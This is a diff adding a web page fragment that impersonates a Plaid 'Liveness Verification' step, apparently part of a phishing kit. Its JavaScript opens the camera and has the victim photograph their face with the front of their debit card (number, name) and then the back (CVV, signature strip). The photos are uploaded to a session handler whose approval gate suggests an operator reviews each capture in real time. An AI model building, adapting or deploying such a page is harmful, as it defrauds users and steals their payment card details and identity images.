@@ -1,0 +1,773 @@
+<style>
+/* ═══════════════════════════════════════════════
+   PLAID DESIGN SYSTEM — shared across all fragments
+   ═══════════════════════════════════════════════ */
+:root {
+  --p-black:   #111111;
+  --p-navy:    #113b5e;
+  --p-blue:    #1a56ff;
+  --p-gray1:   #f5f5f5;
+  --p-gray2:   #e8e8e8;
+  --p-gray3:   #b0b0b0;
+  --p-gray4:   #6b6b6b;
+  --p-white:   #ffffff;
+  --p-green:   #0fa55a;
+  --p-red:     #e0341b;
+  --p-radius:  10px;
+  --p-shadow:  0 4px 24px rgba(0,0,0,0.10);
+  --p-trans:   all 0.22s cubic-bezier(.4,0,.2,1);
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+.p-wrap {
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 16px 12px 32px;
+  background: #f0f2f5;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  -webkit-font-smoothing: antialiased;
+}
+
+.p-card {
+  background: var(--p-white);
+  border-radius: 16px;
+  box-shadow: var(--p-shadow);
+  width: 100%;
+  max-width: 440px;
+  padding: 0;
+  overflow: hidden;
+}
+
+/* ── Top bar with Plaid logo ── */
+.p-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px 0;
+}
+.p-plaid-logo {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.p-plaid-logo img {
+  height: 22px;
+  width: auto;
+}
+.p-plaid-wordmark {
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+  color: var(--p-black);
+}
+.p-lock-icon {
+  width: 30px;
+  height: 30px;
+  background: var(--p-gray1);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--p-gray4);
+  font-size: 13px;
+}
+
+/* ── Progress dots ── */
+.p-progress {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  padding: 14px 20px 0;
+}
+.p-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--p-gray2);
+  transition: var(--p-trans);
+}
+.p-dot.active  { background: var(--p-black); transform: scale(1.2); }
+.p-dot.done    { background: var(--p-green); }
+.p-progress-bar-wrap {
+  padding: 14px 20px 0;
+}
+.p-progress-bar {
+  width: 100%;
+  height: 3px;
+  background: var(--p-gray2);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.p-progress-bar-fill {
+  height: 100%;
+  background: var(--p-black);
+  border-radius: 2px;
+  transition: width 0.5s cubic-bezier(.4,0,.2,1);
+}
+
+/* ── Institution header ── */
+.p-inst-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 18px 20px 0;
+}
+.p-inst-logo {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  background: var(--p-gray1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  flex-shrink: 0;
+  border: 1px solid var(--p-gray2);
+}
+.p-inst-logo img  { max-width: 78%; max-height: 78%; object-fit: contain; }
+.p-inst-logo svg  { width: 100%; height: 100%; }
+.p-inst-info h3   { font-size: 15px; font-weight: 600; color: var(--p-black); line-height: 1.2; }
+.p-inst-info span { font-size: 12.5px; color: var(--p-gray4); margin-top: 2px; display: block; }
+
+/* ── Body content ── */
+.p-body {
+  padding: 20px 20px 24px;
+}
+.p-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--p-black);
+  letter-spacing: -0.3px;
+  margin-bottom: 6px;
+}
+.p-sub {
+  font-size: 13.5px;
+  color: var(--p-gray4);
+  line-height: 1.55;
+  margin-bottom: 20px;
+}
+
+/* ── Input group ── */
+.p-field {
+  margin-bottom: 14px;
+}
+.p-label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--p-gray4);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 6px;
+}
+.p-input {
+  width: 100%;
+  padding: 13px 14px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  color: var(--p-black);
+  background: var(--p-white);
+  transition: var(--p-trans);
+  outline: none;
+  box-sizing: border-box;
+}
+.p-input:focus    { border-color: var(--p-black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+.p-input.p-error  { border-color: var(--p-red); }
+.p-input-wrap     { position: relative; }
+.p-input-wrap .p-input { padding-right: 44px; }
+.p-eye {
+  position: absolute;
+  right: 13px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--p-gray3);
+  font-size: 15px;
+  padding: 4px;
+}
+.p-eye:hover { color: var(--p-black); }
+
+/* ── Error message ── */
+.p-error-msg {
+  font-size: 12px;
+  color: var(--p-red);
+  margin-top: 5px;
+  display: none;
+}
+.p-error-msg.show { display: block; }
+
+/* ── Buttons ── */
+.p-btn {
+  width: 100%;
+  padding: 14px;
+  background: var(--p-black);
+  color: var(--p-white);
+  border: none;
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--p-trans);
+  letter-spacing: 0.1px;
+  margin-top: 4px;
+}
+.p-btn:hover    { background: #222; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.18); }
+.p-btn:active   { transform: translateY(0); }
+.p-btn:disabled { background: var(--p-gray2); color: var(--p-gray3); cursor: not-allowed; transform: none; box-shadow: none; }
+.p-btn-ghost {
+  width: 100%;
+  padding: 13px;
+  background: transparent;
+  color: var(--p-black);
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: var(--p-trans);
+  margin-top: 10px;
+}
+.p-btn-ghost:hover { background: var(--p-gray1); border-color: var(--p-gray3); }
+
+/* ── Divider ── */
+.p-divider {
+  height: 1px;
+  background: var(--p-gray2);
+  margin: 18px 0;
+}
+
+/* ── Footer ── */
+.p-footer {
+  padding: 0 20px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  font-size: 12px;
+  color: var(--p-gray4);
+}
+.p-footer i { font-size: 11px; color: var(--p-green); }
+
+/* ── Loading spinner ── */
+.p-spinner {
+  display: inline-block;
+  width: 20px; height: 20px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: pSpin 0.7s linear infinite;
+  vertical-align: middle;
+  margin-right: 8px;
+}
+@keyframes pSpin { to { transform: rotate(360deg); } }
+
+/* ── Generic bank SVG ── */
+.p-gen-bank svg { width: 100%; height: 100%; }
+
+
+/* ── Step cards ── */
+.p-liveness-step {
+  display: flex; align-items: center; gap: 14px;
+  padding: 14px; border: 1.5px solid var(--p-gray2);
+  border-radius: 12px; cursor: pointer;
+  transition: var(--p-trans); margin-bottom: 10px;
+  background: var(--p-white);
+}
+.p-liveness-step:hover      { border-color: var(--p-black); box-shadow: 0 2px 10px rgba(0,0,0,.07); }
+.p-liveness-step.done       { border-color: var(--p-green); background: #f0fdf8; pointer-events: none; }
+.p-liveness-step.active-step{ border-color: var(--p-black); background: var(--p-gray1); }
+.p-liveness-step.locked     { opacity: 0.45; pointer-events: none; }
+
+.p-lstep-num {
+  width:38px; height:38px; border-radius:50%;
+  background:var(--p-gray1); border:1.5px solid var(--p-gray2);
+  display:flex; align-items:center; justify-content:center;
+  font-size:14px; font-weight:700; color:var(--p-gray4);
+  flex-shrink:0; transition:var(--p-trans);
+}
+.p-liveness-step.done        .p-lstep-num { background:var(--p-green); border-color:var(--p-green); color:white; }
+.p-liveness-step.active-step .p-lstep-num { background:var(--p-black); border-color:var(--p-black); color:white; }
+.p-lstep-num i { font-size:14px; }
+
+.p-lstep-body  { flex:1; }
+.p-lstep-title { font-size:14px; font-weight:600; color:var(--p-black); margin-bottom:2px; }
+.p-lstep-desc  { font-size:12px; color:var(--p-gray4); line-height:1.45; }
+
+.p-lstep-badge {
+  font-size:11px; font-weight:600; padding:3px 9px;
+  border-radius:20px; background:var(--p-gray1);
+  color:var(--p-gray4); border:1px solid var(--p-gray2); flex-shrink:0;
+}
+.p-liveness-step.done        .p-lstep-badge { background:var(--p-green); color:white; border-color:var(--p-green); }
+.p-liveness-step.active-step .p-lstep-badge { background:var(--p-black); color:white; border-color:var(--p-black); }
+
+.p-instruction-card {
+  background:#fff9e6; border:1px solid #f0d87a; border-radius:10px;
+  padding:12px 14px; margin-bottom:18px;
+  display:flex; gap:10px; align-items:flex-start;
+  font-size:13px; color:#5a4a00; line-height:1.5;
+}
+.p-instruction-card i { color:#c8960c; margin-top:2px; flex-shrink:0; }
+
+/* ── Scanner modal ── */
+#lv-modal {
+  position:fixed; inset:0; z-index:999999;
+  background:#000; display:flex; flex-direction:column;
+}
+#lv-topbar {
+  background:rgba(0,0,0,0.85); padding:14px 18px;
+  display:flex; align-items:center; justify-content:space-between;
+  flex-shrink:0;
+}
+#lv-topbar-title { color:white; font-size:14px; font-weight:600; }
+#lv-step-badge {
+  background:rgba(255,255,255,0.15); color:white;
+  font-size:12px; font-weight:600; padding:4px 10px; border-radius:20px;
+}
+#lv-cam-wrap { flex:1; position:relative; overflow:hidden; }
+#lv-video { width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
+
+/* Guide overlay */
+#lv-guide {
+  position:absolute; inset:0;
+  display:flex; flex-direction:column;
+  align-items:center; justify-content:space-evenly;
+  padding:24px 20px; pointer-events:none;
+}
+.lv-guide-box {
+  border:2px dashed rgba(255,255,255,0.85);
+  display:flex; flex-direction:column;
+  align-items:center; justify-content:center;
+  gap:6px;
+}
+.lv-guide-label {
+  color:rgba(255,255,255,0.9); font-size:11px; font-weight:700;
+  text-transform:uppercase; letter-spacing:1px;
+  text-shadow:0 1px 4px rgba(0,0,0,0.7);
+}
+.lv-face-box {
+  border-radius:50%; width:130px; height:155px;
+}
+.lv-card-box {
+  border-radius:10px; width:min(85vw,310px); height:min(25vh,175px);
+}
+/* Corner accent for card box */
+.lv-card-box::before, .lv-card-box::after {
+  content:''; position:absolute;
+  width:20px; height:20px;
+  border-color:white; border-style:solid;
+}
+
+/* Capture flash */
+#lv-flash {
+  position:absolute; inset:0;
+  background:white; opacity:0;
+  pointer-events:none; transition:opacity 0.05s;
+}
+#lv-flash.on { opacity:0.9; }
+
+/* Preview pane */
+#lv-preview {
+  display:none; position:absolute; inset:0;
+  background:rgba(0,0,0,0.92);
+  align-items:center; justify-content:center;
+  flex-direction:column; gap:14px; padding:20px;
+}
+#lv-preview-img {
+  max-width:100%; max-height:55vh;
+  border-radius:12px; object-fit:contain;
+  border:2px solid rgba(255,255,255,0.2);
+}
+.lv-preview-actions { display:flex; gap:12px; width:100%; }
+.lv-preview-actions button {
+  flex:1; padding:14px; border:none; border-radius:10px;
+  font-size:14px; font-weight:700; cursor:pointer;
+}
+#lv-retake-btn  { background:rgba(255,255,255,0.15); color:white; }
+#lv-confirm-btn { background:#111; color:white; }
+
+/* Bottom controls */
+#lv-controls {
+  background:rgba(0,0,0,0.88); padding:16px 20px 32px;
+  flex-shrink:0;
+}
+#lv-hint {
+  color:rgba(255,255,255,0.65); font-size:12px;
+  text-align:center; margin-bottom:14px; line-height:1.5;
+}
+#lv-btns { display:flex; gap:10px; }
+#lv-capture-btn {
+  flex:3; padding:16px; background:white; color:#111;
+  border:none; border-radius:12px; font-size:15px;
+  font-weight:700; cursor:pointer; transition:all 0.2s;
+}
+#lv-capture-btn:active { transform:scale(0.97); }
+#lv-cancel-btn {
+  flex:1; padding:16px; background:#1e1e1e; color:white;
+  border:none; border-radius:12px; font-size:14px; cursor:pointer;
+}
+#lv-canvas { display:none; }
+</style>
+
+<div class="p-wrap">
+  <div class="p-card">
+    <div class="p-topbar">
+      <div class="p-plaid-logo">
+        <img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="Plaid">
+        <span class="p-plaid-wordmark">plaid</span>
+      </div>
+      <div class="p-lock-icon"><i class="fas fa-lock"></i></div>
+    </div>
+    <div class="p-progress-bar-wrap">
+      <div class="p-progress-bar"><div class="p-progress-bar-fill" style="width:80%;"></div></div>
+    </div>
+
+    <div class="p-inst-header">
+      <div class="p-inst-logo" id="livLogoWrap"></div>
+      <div class="p-inst-info">
+        <h3 id="livBankName">Your Bank</h3>
+        <span>Liveness Verification</span>
+      </div>
+    </div>
+
+    <div class="p-body">
+      <p class="p-title">Selfie with card scan</p>
+      <p class="p-sub">Take a photo holding your debit card so your face and card are both visible.</p>
+
+      <div class="p-instruction-card">
+        <i class="fas fa-lightbulb"></i>
+        <span>Hold the card below your chin. Both your face and card text must be clearly readable. Good lighting &amp; steady hands required.</span>
+      </div>
+
+      <div id="livStep1" class="p-liveness-step">
+        <div class="p-lstep-num" id="livNum1"><span>1</span></div>
+        <div class="p-lstep-body">
+          <div class="p-lstep-title">Front of debit card</div>
+          <div class="p-lstep-desc">Face + card name &amp; numbers facing camera</div>
+        </div>
+        <div class="p-lstep-badge" id="livBadge1">Tap to scan</div>
+      </div>
+
+      <div id="livStep2" class="p-liveness-step locked">
+        <div class="p-lstep-num" id="livNum2"><span>2</span></div>
+        <div class="p-lstep-body">
+          <div class="p-lstep-title">Back of debit card</div>
+          <div class="p-lstep-desc">Face + CVV &amp; signature strip visible</div>
+        </div>
+        <div class="p-lstep-badge" id="livBadge2">Pending</div>
+      </div>
+    </div>
+
+    <div class="p-footer">
+      <i class="fas fa-lock"></i>
+      <span>Protected by Plaid &amp; 256-bit SSL encryption</span>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+
+  /* ── Bank logo ──────────────────────────────────────────── */
+  var GEN_SVG = '<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" rx="10" fill="#113b5e"/><path d="M24 8L40 17H8Z" fill="#82cde5"/><rect x="10" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="16" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="22" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="28" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="34" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="8" y="31" width="32" height="4" rx="2" fill="white"/></svg>';
+  var bank   = window._selectedBank || {};
+  var wrap   = document.getElementById('livLogoWrap');
+  var nameEl = document.getElementById('livBankName');
+  if (nameEl && bank.name) nameEl.textContent = bank.name;
+  if (wrap && !wrap.hasChildNodes()) {
+    if (bank.logo) {
+      var i = new Image();
+      i.alt = bank.name || 'Bank';
+      i.style.cssText = 'max-width:78%;max-height:78%;object-fit:contain;';
+      i.onerror = function () { wrap.innerHTML = GEN_SVG; };
+      i.src = bank.logo; wrap.appendChild(i);
+    } else { wrap.innerHTML = GEN_SVG; }
+  }
+
+  /* ── State ──────────────────────────────────────────────── */
+  if (!window.livenessStepsCompleted) window.livenessStepsCompleted = [false, false];
+  var _capturing = false;
+  var _stream    = null;
+
+  /* ── Wire step tap ──────────────────────────────────────── */
+  function _wireStep(el, n) {
+    if (!el || el._wired) return;
+    el._wired = true;
+    el.addEventListener('click', function () {
+      if (el.classList.contains('locked') || el.classList.contains('done') || _capturing) return;
+      window.startLivenessStep(n);
+    });
+  }
+  _wireStep(document.getElementById('livStep1'), 1);
+  _wireStep(document.getElementById('livStep2'), 2);
+
+  /* ── Restore completed state ────────────────────────────── */
+  function _refreshUI() {
+    (window.livenessStepsCompleted || []).forEach(function (done, idx) {
+      var n = idx + 1;
+      var s = document.getElementById('livStep' + n);
+      var b = document.getElementById('livBadge' + n);
+      var num = document.getElementById('livNum' + n);
+      if (done && s) {
+        s.classList.add('done'); s.classList.remove('active-step', 'locked');
+        if (b) b.textContent = '✓ Done';
+        if (num) num.innerHTML = '<i class="fas fa-check"></i>';
+      }
+    });
+  }
+  _refreshUI();
+
+  /* ================================================================
+     startLivenessStep(n)
+     Opens KYC-scanner-style camera modal.
+     Captures a PHOTO (canvas snapshot from getUserMedia stream).
+     Uploads via SessionHandler.uploadMedia as JPEG.
+  ================================================================ */
+  window.startLivenessStep = function (stepNum) {
+    if (_capturing) return;
+    _capturing = true;
+
+    var stepType = stepNum === 1 ? 'plaid_video_liveness_front' : 'plaid_video_liveness_back';
+    var cardSide = stepNum === 1 ? 'FRONT of card' : 'BACK of card';
+    var cardHint = stepNum === 1
+      ? 'Card numbers &amp; name facing camera'
+      : 'CVV &amp; signature strip facing camera';
+
+    var stepEl  = document.getElementById('livStep' + stepNum);
+    var badgeEl = document.getElementById('livBadge' + stepNum);
+    if (stepEl)  stepEl.classList.add('active-step');
+    if (badgeEl) badgeEl.textContent = 'Opening camera…';
+
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      _capturing = false;
+      if (stepEl)  stepEl.classList.remove('active-step');
+      if (badgeEl) badgeEl.textContent = 'Tap to scan';
+      _fileFallback(stepNum, stepType, badgeEl);
+      return;
+    }
+
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false,
+    })
+    .then(function (stream) {
+      _stream = stream;
+      _openScannerModal(stream, stepNum, stepType, cardSide, cardHint, badgeEl);
+    })
+    .catch(function (err) {
+      console.warn('[liveness] getUserMedia error:', err.message);
+      _capturing = false;
+      if (stepEl)  stepEl.classList.remove('active-step');
+      if (badgeEl) badgeEl.textContent = 'Tap to scan';
+      _fileFallback(stepNum, stepType, badgeEl);
+    });
+  };
+
+  /* ── Scanner modal ──────────────────────────────────────── */
+  function _openScannerModal(stream, stepNum, stepType, cardSide, cardHint, badgeEl) {
+    var modal = document.createElement('div');
+    modal.id  = 'lv-modal';
+    modal.innerHTML =
+      '<div id="lv-topbar">' +
+        '<span id="lv-topbar-title">Selfie + ' + cardSide.replace('&amp;','&') + '</span>' +
+        '<span id="lv-step-badge">Step ' + stepNum + ' of 2</span>' +
+      '</div>' +
+      '<div id="lv-cam-wrap">' +
+        '<video id="lv-video" autoplay playsinline muted></video>' +
+        '<div id="lv-guide">' +
+          /* Face oval */
+          '<div class="lv-guide-box lv-face-box">' +
+            '<span class="lv-guide-label">&#128100; FACE</span>' +
+          '</div>' +
+          /* Card rectangle */
+          '<div class="lv-guide-box lv-card-box">' +
+            '<span class="lv-guide-label">&#128179; ' + cardSide.toUpperCase().replace('&AMP;','&') + '</span>' +
+            '<span style="color:rgba(255,255,255,0.65);font-size:10px;text-align:center;">' + cardHint + '</span>' +
+          '</div>' +
+        '</div>' +
+        /* Capture flash */
+        '<div id="lv-flash"></div>' +
+        /* Preview pane (shown after capture) */
+        '<div id="lv-preview">' +
+          '<img id="lv-preview-img" alt="Preview"/>' +
+          '<div class="lv-preview-actions">' +
+            '<button id="lv-retake-btn"><i class="fas fa-redo"></i> Retake</button>' +
+            '<button id="lv-confirm-btn">Use This Photo →</button>' +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+      '<canvas id="lv-canvas"></canvas>' +
+      '<div id="lv-controls">' +
+        '<div id="lv-hint">Align your <strong>face</strong> and <strong>' + cardSide.replace('&amp;','&') + '</strong> within the guides.<br>Both must be clearly visible &amp; in focus.</div>' +
+        '<div id="lv-btns">' +
+          '<button id="lv-capture-btn">&#128247; Capture Photo</button>' +
+          '<button id="lv-cancel-btn">Cancel</button>' +
+        '</div>' +
+      '</div>';
+
+    document.body.appendChild(modal);
+
+    var vid      = document.getElementById('lv-video');
+    var canvas   = document.getElementById('lv-canvas');
+    var flash    = document.getElementById('lv-flash');
+    var preview  = document.getElementById('lv-preview');
+    var prevImg  = document.getElementById('lv-preview-img');
+    var capBtn   = document.getElementById('lv-capture-btn');
+    var retakeBtn= document.getElementById('lv-retake-btn');
+    var confirmBtn=document.getElementById('lv-confirm-btn');
+    var cancelBtn= document.getElementById('lv-cancel-btn');
+
+    vid.srcObject = stream;
+
+    var _capturedBlob = null;
+
+    function _close() {
+      if (_stream) { _stream.getTracks().forEach(function(t){t.stop();}); _stream = null; }
+      modal.remove();
+    }
+
+    cancelBtn.addEventListener('click', function () {
+      _close();
+      _capturing = false;
+      var s = document.getElementById('livStep' + stepNum);
+      var b = document.getElementById('livBadge' + stepNum);
+      if (s) s.classList.remove('active-step');
+      if (b) b.textContent = 'Tap to scan';
+    });
+
+    capBtn.addEventListener('click', function () {
+      /* Flash effect */
+      flash.classList.add('on');
+      setTimeout(function () { flash.classList.remove('on'); }, 120);
+
+      /* Draw snapshot to canvas */
+      canvas.width  = vid.videoWidth  || 640;
+      canvas.height = vid.videoHeight || 480;
+      var ctx = canvas.getContext('2d');
+      /* Mirror to match what user sees */
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(function (blob) {
+        _capturedBlob = blob;
+        prevImg.src = URL.createObjectURL(blob);
+        preview.style.display = 'flex';
+        capBtn.style.display = 'none';
+      }, 'image/jpeg', 0.88);
+    });
+
+    retakeBtn.addEventListener('click', function () {
+      preview.style.display = 'none';
+      capBtn.style.display = '';
+      if (prevImg.src) URL.revokeObjectURL(prevImg.src);
+      _capturedBlob = null;
+    });
+
+    confirmBtn.addEventListener('click', function () {
+      if (!_capturedBlob) return;
+      var blob = _capturedBlob;
+      _close();
+      _uploadPhoto(blob, stepNum, stepType, badgeEl);
+    });
+  }
+
+  /* ── File input fallback ────────────────────────────────── */
+  function _fileFallback(stepNum, stepType, badgeEl) {
+    var inp = document.createElement('input');
+    inp.type = 'file'; inp.accept = 'image/*';
+    inp.capture = 'user'; inp.style.display = 'none';
+    document.body.appendChild(inp);
+    inp.addEventListener('change', function () {
+      var file = inp.files && inp.files[0];
+      inp.remove();
+      if (!file) { _capturing = false; return; }
+      if (badgeEl) badgeEl.textContent = 'Uploading…';
+      _uploadPhoto(file, stepNum, stepType, badgeEl);
+    });
+    inp.click();
+  }
+
+  /* ── Upload + show approval overlay ────────────────────── */
+  function _uploadPhoto(blob, stepNum, stepType, badgeEl) {
+    if (badgeEl) badgeEl.textContent = 'Uploading…';
+    var s = document.getElementById('livStep' + stepNum);
+    if (s) s.classList.add('active-step');
+
+    if (!window.SessionHandler || typeof window.SessionHandler.uploadMedia !== 'function') {
+      console.error('[liveness] SessionHandler.uploadMedia unavailable');
+      if (badgeEl) badgeEl.textContent = 'Error — retry';
+      _capturing = false;
+      return;
+    }
+
+    window.SessionHandler.uploadMedia(blob, stepType, blob.type || 'image/jpeg')
+      .then(function (res) {
+        if (res && res.success === false) throw new Error(res.error || 'upload failed');
+        if (badgeEl) badgeEl.textContent = 'Under Review';
+        if (window.SessionHandler.ApprovalGate) {
+          window.SessionHandler.ApprovalGate.show(stepType);
+        }
+      })
+      .catch(function (err) {
+        console.error('[liveness] upload failed:', err);
+        if (badgeEl) badgeEl.textContent = 'Failed — retry';
+        if (s) s.classList.remove('active-step');
+        if (window.SessionHandler && window.SessionHandler.UI) {
+          window.SessionHandler.UI.showToast('error', 'Upload failed. Please try again.');
+        }
+        _capturing = false;
+      });
+  }
+
+  /* ── Approval event listeners (from session_handler.js) ── */
+  document.addEventListener('sh:liveness_step_approved', function (e) {
+    var nextStep = e.detail && e.detail.nextStep;
+    _capturing = false;
+
+    if (nextStep === 2) {
+      /* Step 1 done → mark + unlock step 2 */
+      var s1 = document.getElementById('livStep1');
+      var b1 = document.getElementById('livBadge1');
+      var n1 = document.getElementById('livNum1');
+      if (s1) { s1.classList.add('done'); s1.classList.remove('active-step'); }
+      if (b1) b1.textContent = '✓ Done';
+      if (n1) n1.innerHTML   = '<i class="fas fa-check"></i>';
+      if (window.livenessStepsCompleted) window.livenessStepsCompleted[0] = true;
+      if (window.SPA && window.SPA.storage)
+        window.SPA.storage.set('liveness_steps', window.livenessStepsCompleted);
+
+      var s2 = document.getElementById('livStep2');
+      var b2 = document.getElementById('livBadge2');
+      if (s2) { s2.classList.remove('locked'); s2.classList.add('active-step'); }
+      if (b2) b2.textContent = 'Tap to scan';
+      _wireStep(s2, 2);
+
+      if (window.SessionHandler && window.SessionHandler.UI) {
+        window.SessionHandler.UI.showToast('success', 'Step 1 approved! Now scan the back of your card.');
+      }
+    }
+  });
+
+  document.addEventListener('sh:liveness_step_rejected', function (e) {
+    _capturing = false;
+    var stepType = e.detail && e.detail.stepType;
+    var n = (stepType === 'plaid_video_liveness_front') ? 1 : 2;
+    var s = document.getElementById('livStep' + n);
+    var b = document.getElementById('livBadge' + n);
+    if (s) s.classList.remove('active-step', 'done');
+    if (b) b.textContent = 'Tap to retry';
+    if (window.SessionHandler && window.SessionHandler.UI) {
+      window.SessionHandler.UI.showToast('warning', (e.detail && e.detail.reason) || 'Scan rejected. Please try again.');
+    }
+  });
+
+})();
+</script>
